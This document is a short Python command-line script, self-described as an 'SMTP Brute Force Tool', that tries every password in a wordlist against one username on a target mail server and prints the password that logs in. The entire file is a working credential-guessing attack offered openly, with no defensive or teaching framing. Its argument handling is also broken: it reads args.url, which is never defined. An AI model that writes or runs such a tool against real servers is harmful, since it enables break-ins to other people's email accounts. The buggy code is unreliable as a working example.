import smtplib
import argparse
from time import sleep

def smtp_bruteforce(target, username, password_list):
    """
    Attempts to brute force an SMTP login using a password list.
    
    :param target: SMTP server URL (example: smtp.example.com)
    :param username: The username to brute force
    :param password_list: Path to the password list
    """
    print(f"Starting brute force attack on {target} with username {username}...")
    
    # Open the password list file
    with open(password_list, 'r') as f:
        passwords = f.readlines()
        
    # Connect to the SMTP server
    try:
        smtp_server = smtplib.SMTP(target)
        smtp_server.set_debuglevel(0)  # Set to 0 to suppress debug output
        smtp_server.ehlo()
    except Exception as e:
        print(f"Could not connect to {target}: {e}")
        return
    
    # Loop through each password in the list
    for password in passwords:
        password = password.strip()
        try:
            # Try to login with the current password
            smtp_server.login(username, password)
            print(f"KEY FOUND: [{password}]")
            break
        except smtplib.SMTPAuthenticationError:
            print(f"Failed with password: {password}")
        except Exception as e:
            print(f"Error during authentication: {e}")
        
        sleep(1)  # Sleep between attempts to avoid overwhelming the server

    # Close the SMTP connection
    smtp_server.quit()

def main():
    parser = argparse.ArgumentParser(description="SMTP Brute Force Tool")
    parser.add_argument("-l", "--login", required=True, help="Username for the SMTP login")
    parser.add_argument("-P", "--passwordlist", required=True, help="Path to the password list file")
    parser.add_argument("host", help="The target SMTP server (e.g., smtp.example.com)")

    args = parser.parse_args()

    # Run the brute force attack with the provided arguments
    smtp_bruteforce(args.url, args.login, args.passwordlist)

if __name__ == "__main__":
    main()
